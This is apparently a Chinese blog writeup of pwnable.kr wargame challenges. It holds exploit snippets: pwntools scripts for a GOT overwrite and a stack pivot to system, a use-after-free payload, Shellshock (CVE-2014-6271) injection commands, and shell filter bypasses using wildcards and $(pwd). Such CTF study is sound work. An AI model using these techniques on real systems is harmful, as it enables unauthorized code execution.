---
layout:     post
title:      pwnable部分writeup
author:     wooy0ung
tags: 		pwn
category:  	writeup
---

- 目录
{:toc #markdown-toc}

>[索引目录]  
>0x001 fd  
>0x002 collision  
>0x003 bof  
>0x004 flag  
>0x005 passcode  
>0x006 random  
<!-- more -->
>0x007 input  
>0x008 leg  
>0x009 mistake  
>0x010 shellshock  
>0x011 coin1  
>0x012 blackjack  
>0x013 lotto  
>0x014 cmd1  
>0x015 cmd2  
>0x016 uaf  
>0x017 memcpy  
>0x018 codemap  
>0x019 simple login  


### 0x001 fd

>Problem Description:  
>Mommy! what is a file descriptor in Linux?  
>  
>* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU  
>  
>Address:  
>ssh fd@pwnable.kr -p2222 (pw:guest)  

![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x001-001.png)

令fd = 0(标准输入), 输入"LETMEWIN"字串
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x001-002.png)

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x001-003.png)


## 0x002 collision

>Problem Description:  
>Daddy told me about cool MD5 hash collision today.  
>I wanna do something like that too!  
>  
>Address:  
>ssh col@pwnable.kr -p2222 (pw:guest)  

输入 passcode, len = 20 bytes, 以 4 bytes 为一组的 hex 值累加, 与关键值 0x21DD09EC 比较
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x002-001.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x002-002.png)

注意, 不能以 "\xEC\x09\xDD\x21" + 16 * "\x00\x00\x00\x00", 否则 strlen 返回 len < 20
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x002-003.png)

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x002-004.png)


## 0x003 bof

>Problem Description:  
>Nana told me that buffer overflow is one of the most common software vulnerability.   
>Is that true?  
>  
>Download:  
>http://pwnable.kr/bin/bof  
>http://pwnable.kr/bin/bof.c  
>  
>Address:  
>nc pwnable.kr 9000  

填充 0x2c+0x8 个bytes,  继续写入8个bytes即可将a1覆盖为0xcafebabe
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x003-001.png)

getshell~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x003-002.png)


## 0x004 flag

>Problem Description:  
>Papa brought me a packed present! let's open it.  
>  
>Download:  
>http://pwnable.kr/bin/flag  
>  
>Supplementary:  
>This is reversing task. all you need is binary  

先侦壳, 发现被加了UPX
```
$ xxd flag | tail
```
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x004-001.png)

也可以用工具查
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x004-002.png)

脱壳
```
$ upx -d flag
```

拖到IDA, 定位到可疑字符串"UPX...? sounds like a delivery service", 提交后错误, 应该某些字符没正常显示
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x004-003.png)

放到winhex, 检索UPX得到完整的flag, UPX...? sounds like a delivery service :)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x004-004.png)


## 0x005 passcode

>Problem Description:  
>Mommy told me to make a passcode based login system.  
>My initial C code was compiled without any error!  
>Well, there was some compiler warning, but who cares about that?  
>  
>Address:  
>ssh passcode@pwnable.kr -p2222 (pw:guest)  

if passcode1 = 338150 & passcode2 = 13371337, getshell～
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-001.png)

开了GS
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-002.png)

考虑到 welcome、login 的ebp相同, 利用 welcome 的name来溢出
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-003.png)

查看 name、passcode1、passcode2 在栈中的位置
```
$ objdump -d ./passcode
```
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-004.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-005.png)

name 距离 passcode1 0x70 - 0x10 = 0x60 bytes, 溢出完由于GS造成崩溃, 不能利用login来getshell
```
$ objdump -R ./passcode
```
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-006.png)

现在可以实现任意写, 将printf@got改写成call system处的地址
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-007.png)

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

s = process('./passcode')

printf_addr = 0x0804a000
system_addr = 134514147

p = "1" * 0x60 
p += p32(printf_addr) 
p += "\n"
p += str(system_addr) 
p += "\n"

s.send(payload)
s.recv()
```

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x005-008.png)


## 0x006 random

>Problem Description:  
>Daddy, teach me how to use random value in programming!  
>  
>Address:  
>ssh random@pwnable.kr -p2222 (pw:guest)  

if key ^ random = 0xdeadbeef, getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x006-001.png)

未设置随机数种子, 默认种子为 srand(1), 每次生成的伪随机数都相同
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x006-002.png)

通过debug拿到random值
```
$ x /20i $pc
$ i r
```
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x006-003.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x006-004.png)

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x006-005.png)


## 0x007 input

>Problem Description:  
>Mom? how can I pass my input to a computer program? 
>  
>Address:  
>ssh input2@pwnable.kr -p2222 (pw:guest)

不解释, 按照要求输入即可~
```
import subprocess
import os
import sys, socket, struct
import time

# stage 1: arg
args = 'A' * 99
args = list(args)
args[ord('A')-1] = ""
args[ord('B')-1] = "\x20\x0a\x0d"
args[ord('C')-1] = "2224"

# stage 2: stdin
stdinr, stdinw = os.pipe()
stderrr, stderrw = os.pipe()
os.write(stdinw, "\x00\x0a\x00\xff")
os.write(stderrw, "\x00\x0a\x02\xff")

# stage 3: env
my_env = os.environ.copy()
path = "/tmp/exploit:" + my_env["PATH"]
environ = {"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe", "PATH": path}

# stage 4: fileio
f = open("\x0a", "wb")
f.write("\x00\x00\x00\x00")
f.close()

# stage 5: network
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

proc = subprocess.Popen(["/home/input2/input"] + args, env = dict(os.environ,**environ), stdin=stdinr, stderr=stderrr)
time.sleep(1)
s.connect(("127.0.0.1", 2224))
s.send("\xde\xad\xbe\xef")
s.close()
```

scp上传到远程主机, tmp没有权限, 需要新建一个exploit文件夹
```
$ scp -P 2222 exploit.py input2@pwnable.kr:/tmp/exploit
```

将input2目录下的flag链接到exploit目录
```
$ ln -s /home/input2/flag flag
```

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x007-001.png)


## 0x008 leg

>Problem Description:  
>Daddy told me I should study arm.  
>But I prefer to study my leg!  
>  
>Download:  
>http://pwnable.kr/bin/leg.c  
>http://pwnable.kr/bin/leg.asm  
>Address:  
>ssh leg@pwnable.kr -p2222 (pw:guest)  

if key1+key2+key3 = key, getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x008-001.png)

ARM指令处理的三级流水: 执行(PC-8)、译码(PC-4)、取指(PC), PC指向正在执行指令的后2条
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x008-002.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x008-003.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x008-004.png)

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x008-005.png)


## 0x009 mistake

>Problem Description:  
>We all make mistakes, let's move on.  
>(don't take this too seriously, no fancy hacking skill is required at all)  
>  
>This task is based on real event  
>Thanks to dhmonkey  
>  
>hint : operator priority  
>  
>Address:  
>ssh mistake@pwnable.kr -p2222 (pw:guest)  

运算优先级问题, '>'的优先级大于'='
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x009-001.png)

0000000000 ^ 1111111111 = 1111111111, cmp 1111111111 1111111111 -> getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x009-002.png)


## 0x010 shellshock

>Problem Description:  
>Mommy, there was a shocking news about bash.  
>I bet you already know, but lets just make it sure :)  
>Address:  
>ssh shellshock@pwnable.kr -p2222 (pw:guest)  

CVE-2014-6271 破壳漏洞利用, 先检验漏洞是否存在
```
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x010-001.png)

构造一下利用
```
$ env x='() { :;}; /bin/cat flag' bash -c "./shellshock"
```

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x010-002.png)


## 0x011 coin1

>Problem Description:  
>Mommy, I wanna play a game!  
>(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)  
>Address:  
>nc pwnable.kr 9007  

每次以 C 次尝试在 N 枚coin中找到次品, 胜利100次就能拿到flag
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x011-001.png)

多次尝试发现 N <= 2^C, 采用二分法
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x011-002.png)

```
from pwn import *
import re

def get_weight(start,end,r):
    send_str = ""
    if start == end:
        r.sendline(str(start))
    else:
        for i in range(start,end + 1 ):
            send_str = send_str + str(i)+" "
        r.sendline(send_str)
    result = r.recvline()
    return int(result)

def choose_coin(num,chance,r):
    start = 0
    end = num -1
    weight = 0
    for i in range(0,chance  ):
        weight = get_weight(start,int(start+(end-start)/2),r)
        if weight%10 != 0:
            end = int(start+(end-start)/2)
        else:
            start = int(start+(end-start)/2 )+1
    r.sendline(str(end))
    print '[+]server: ',r.recvline()

r = remote('127.0.0.1',9007)
print r.recv()

for i in range(0,100):
    print '[*]','='*18," ",i," ","="*18 ,"[*]"
    recvword = r.recvline()
    print "[+]server: ",recvword
    p = re.compile(r'\d+')
    data = p.findall(recvword)
    num = int(data[0])
    chance = int(data[1])
    choose_coin(num,chance,r)
print r.recv()
```

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x011-003.png)


## 0x012 blackjack

>Problem Description:  
>Hey! check out this C implementation of blackjack game!  
>I found it online  
>* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html  
>  
>I like to give my flags to millionares.  
>how much money you got?   
>Address:  
>nc pwnable.kr 9009  

一个有bug的小游戏, cash 达到 100W 就能拿flag
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x012-001.png)

检查源码发现, betting 处进入 if 后 bet可以写任意数值
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x012-002.png)

尽情玩吧, 赢一次即可, getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x012-003.png)


## 0x013 lotto

>Problem Description:  
>Mommy! I made a lotto program for my homework.  
>do you want to play?  
>Address:  
>ssh lotto@pwnable.kr -p2222 (pw:guest)  

提交 6 bytes字符 submit, 再从 /dev/urandom 读入 6 bytes字符 lotto
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x013-001.png)

lotto[i] = (lotto[i] % 45) + 1
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x013-002.png)

提交 6 bytes 32 ～ 45 的 ASCII 字符(例如本次的 &&&&&&), 只要在lotto中出现过, 则match = 6, getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x013-003.png)


## 0x014 cmd1

>Problem Description:  
>Mommy! what is PATH environment in Linux?  
>Address:  
>ssh cmd1@pwnable.kr -p2222 (pw:guest)  

查看源码, 过滤了 flag、sh、tmp 字符
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x014-001.png)

利用通配符*绕过, getflag~
```
$ ./cmd1 "/bin/cat f*"
mommy now I get what PATH environment is for :)
```

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x014-002.png)


## 0x015 cmd2

>Problem Description:  
>Daddy bought me a system command shell.  
>but he put some filters to prevent me from playing with it without his permission...  
>but I wanna play anytime I want!  
>Address:  
>ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)  

相比 cmd1, 还过滤了 '/' 字符, 利用 pwd 绕过
```
$ /home/cmd2/cmd2 '""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*""'
```

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x015-001.png)


## 0x016 uaf

>Problem Description:  
>Mommy, what is Use After Free bug?  
>Address:  
>ssh uaf@pwnable.kr -p2222 (pw:guest)   

直接看源码, case2处能构造任意写
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-001.png)

Human处的give_shell是本次getshell的target
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-002.png)

copy到本地
```
$ scp -P 2222 uaf@pwnable.kr:/home/uaf/uaf ~/toolchain/
```

拖到IDA分析, 先请求分配0x18bytes, 返回指针v3
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-003.png)

v3指向的18 bytes的开始8 bytes存放give_shell的地址
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-004.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-005.png)

再看看case1, fastcall +8调用了introduce
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-006.png)

利用uaf触发case2处任意写, 将&give_shell - 8写入v3指针
```
$ python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/give_shell
$ ./uaf 24 "/tmp/give_shell"
```

![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x016-007.png)


## 0x017 memcpy

>Problem Description:  
>Are you tired of hacking?, take some rest here.  
>Just help me out with my small experiment regarding memcpy performance.  
>after that, flag is yours.  
>Download:  
>http://pwnable.kr/bin/memcpy.c  
>Address:  
>ssh memcpy@pwnable.kr -p2222 (pw:guest)  

copy源码, 先编译跑一遍
```
$ apt-get install g++-multilib
$ gcc -o memcpy memcpy.c -m32 -lm
```

发现调用fast_memcpy报错, 检查源码
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-001.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-002.png)

发现movntps指令需要16 bytes对齐
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-003.png)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-004.png)

本地GDB debug, 在fast_memcpy 0x8048737下断
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-005.png)

转到movntps XMMWORD PTR [edx], xmm0
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-006.png)

发现edx没有16bytes对齐
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-007.png)

构造一串size令edx 16 bytes对齐, 8 16 32(if len<64), 72 136 264 520 1032 2056 4104(if len>=64)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-008.png)

getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x017-009.png)


## 0x018 codemap

>Problem Description:  
>I have a binary that has a lot information inside heap.  
>How fast can you reverse-engineer this?  
>(hint: see the information inside EAX,EBX when 0x403E65 is executed)  
>Download:  
>http://pwnable.kr/bin/codemap.exe  
>Address:  
>ssh codemap@pwnable.kr -p2222 (pw:guest)  

根据提示ssh连上远程主机, nc连上本地进程, 提示要依次输入2nd、3nd biggest的chunk里存放的string
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-001.png)

直接看伪代码, 先伪随机生成 size 为 0～99999 的堆块(v9 = random_size)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-002.png)

从字串 "abc...890" 随机 copy 16 bytes 到堆上(v18 = chunk_addr)
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-003.png)

循环 1000 次, 随机数种子 srand(v16), 每轮程序运行生成的堆块大小与存储字串一致
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-004.png)

本地 debug exe, 定位到 0x00403E65(先关闭ASLR), 此时 eax 存放size, ebx 存放 string_addr
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-005.png)

由于循环1000次, 人工处理比较麻烦, 这里直接写个 python 脚本 dump 出寄存器数据
```
#!/usr/bin/python
# -*- coding:utf8 -*-

from idaapi import *  
from idc import *  
import os

count = 0
eax_list = list()
ebx_list = list()

try:
    if debugger:
        print("[*] Removing previous hook ...")
        debugger.unhook()
except:
    pass

AddBpt(0x403E65)
print "[*] Set hook OK ...\n"

StartDebugger("","","")  
for i in range(0,999):
    GetDebuggerEvent(WFNE_SUSP|WFNE_CONT, -1)
    print "[+]",i
    eax = GetRegValue("EAX")
    eax_list.append(eax)
    ebx = GetRegValue("EBX")
    ebx_list.append(ebx)
    if i == 998:
        print '[+] eax max : ',max(eax_list)
        index = eax_list.index(max(eax_list))
        a = ebx_list[index]
        Message("%x"%a)
        print "max",GetString(a)
        del(eax_list[index])
        del(ebx_list[index])

        print '[+] eax second : ',max(eax_list)
        index = eax_list.index(max(eax_list))
        a = ebx_list[index]
        Message("%x"%a)
        print "second",GetString(a)
        del(eax_list[index])
        del(ebx_list[index])        

        print '[+] eax third : ',max(eax_list)
        index = eax_list.index(max(eax_list))
        a = ebx_list[index]
        Message("%x"%a)
        print "third",GetString(a)
        del(eax_list[index])
        del(ebx_list[index])
```
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-006.png)

将得到的 string 提交到远程主机, getflag~
![](/assets/img/writeup/2017-08-13-pwnable-writeup/0x018-007.png)


## 0x019 simple login

memcpy函数导致栈溢出
```
# .c
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5(&v2, 12);
  printf("hash : %s\n", (char)s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}

# asm
...
.text:080492E3                 call    printf
.text:080492E8                 mov     eax, [ebp+s2]
.text:080492EB                 mov     [esp+4], eax    ; s2
.text:080492EF                 mov     dword ptr [esp], offset s1 ; "f87cd601aa7fedca99018a8be88eda34"
.text:080492F6                 call    _strcmp
.text:080492FB                 test    eax, eax
.text:080492FD                 jnz     short loc_8049306
.text:080492FF                 mov     eax, 1
.text:08049304                 jmp     short locret_804930B
.text:08049306 ; ---------------------------------------------------------------------------
.text:08049306
.text:08049306 loc_8049306:                            ; CODE XREF: auth+61↑j
.text:08049306                 mov     eax, 0
.text:0804930B
.text:0804930B locret_804930B:                         ; CODE XREF: auth+68↑j
.text:0804930B                 leave
.text:0804930C                 retn

# &input
.bss:0811EB40 input           db    ? ;               ; DATA XREF: correct+6↑o
.bss:0811EB40                                         ; auth+D↑o ...
.bss:0811EB41                 db    ? ;
.bss:0811EB42                 db    ? ;
.bss:0811EB43                 db    ? ;
.bss:0811EB44                 db    ? ;
.bss:0811EB45                 db    ? ;
.bss:0811EB46                 db    ? ;
.bss:0811EB47                 db    ? ;
.bss:0811EB48                 db    ? ;
```

shellcode长度要求 < 12 byte
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-28h]
  char s; // [esp+1Eh] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-4h]

  memset(&s, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ");
  _isoc99_scanf("%30s", &s);
  memset(&input, 0, 0xCu);
  v4 = 0;
  v6 = Base64Decode((int)&s, &v4);
  if ( v6 > 12 )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v4, v6);
    if ( auth(v6) == 1 )
      correct();
  }
  return 0;
}
```

溢出ebp，指向bss + 4
```
from pwn import *

s = process("./pwn")
elf = ELF("./pwn")

callsystem = 0x08049284
input_addr = 0x0811EB40

p = "A" * 4
p += p32(callsystem)
p += p32(input_addr)

s.recvuntil("Authenticate : ")
s.send(p.encode("base64"))

s.interactive()
```